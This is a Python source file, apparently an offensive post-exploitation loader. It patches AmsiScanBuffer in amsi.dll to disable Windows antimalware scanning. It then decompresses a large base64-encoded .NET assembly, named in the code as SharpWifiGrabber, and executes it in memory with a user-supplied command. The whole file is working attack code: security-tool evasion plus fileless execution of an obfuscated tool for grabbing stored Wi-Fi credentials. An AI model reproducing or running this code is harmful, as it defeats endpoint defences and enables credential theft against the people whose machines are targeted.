import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpWifiGrabber.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()